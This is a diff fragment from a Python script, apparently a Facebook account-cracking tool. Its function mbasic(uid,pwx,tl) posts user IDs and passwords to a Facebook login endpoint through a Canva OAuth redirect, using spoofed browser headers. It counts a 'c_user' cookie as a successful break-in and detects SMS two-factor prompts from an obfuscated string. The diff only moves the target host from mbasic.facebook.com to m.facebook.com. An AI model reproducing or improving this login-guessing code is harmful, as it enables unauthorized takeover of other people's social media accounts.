@@ -1286,14 +1286,14 @@ def mbasic(uid,pwx,tl):
             'a': 'AYlZYUDiZqtfVxy_hd3jd217cyf2OexqVPFlTnUxynLWBo_wjxuJYFLWrUtycfiSD0Z65CyKW4F3k-tk1mj_6diK9rYLliY-s2Y5TR-47hJBog',
             'user': '0'}
             headers = {
-            'authority': 'mbasic.facebook.com',
+            'authority': 'm.facebook.com',
             'method': 'GET',
             'path': '/login/device-based/login/async/',
             'scheme': 'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;',
             'accept-encoding': 'gzip, deflate, br',
             'accept-language': 'en-US,en;q=0.9',
-            'referer': 'https://mbasic.facebook.com',
+            'referer': 'https://m.facebook.com',
             'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Windows"',
@@ -1303,7 +1303,7 @@ def mbasic(uid,pwx,tl):
             'upgrade-insecure-requests': '1',
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36'}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://mbasic.facebook.com/login/device-based/login/async/?skip_api_login=1&api_key=525265914179580&kid_directed_site=0&app_id=525265914179580&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv16.0%2Fdialog%2Foauth%3Fstate%3Dc331f5c2-225c-405a-941b-4715d6f04301%26scope%3Demail%252Copenid%252Cpublic_profile%26response_type%3Dcode%26client_id%3D525265914179580%26redirect_uri%3Dhttps%253A%252F%252Fwww.canva.com%252Foauth%252Fauthorized%252Ffacebook%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D46ac04ce-40f7-4d35-8ab0-ffebead92849%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.canva.com%2Foauth%2Fauthorized%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dc331f5c2-225c-405a-941b-4715d6f04301%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated"
+            url = "https://m.facebook.com/login/device-based/login/async/?skip_api_login=1&api_key=525265914179580&kid_directed_site=0&app_id=525265914179580&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv16.0%2Fdialog%2Foauth%3Fstate%3Dc331f5c2-225c-405a-941b-4715d6f04301%26scope%3Demail%252Copenid%252Cpublic_profile%26response_type%3Dcode%26client_id%3D525265914179580%26redirect_uri%3Dhttps%253A%252F%252Fwww.canva.com%252Foauth%252Fauthorized%252Ffacebook%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D46ac04ce-40f7-4d35-8ab0-ffebead92849%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.canva.com%2Foauth%2Fauthorized%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dc331f5c2-225c-405a-941b-4715d6f04301%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated"
             po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
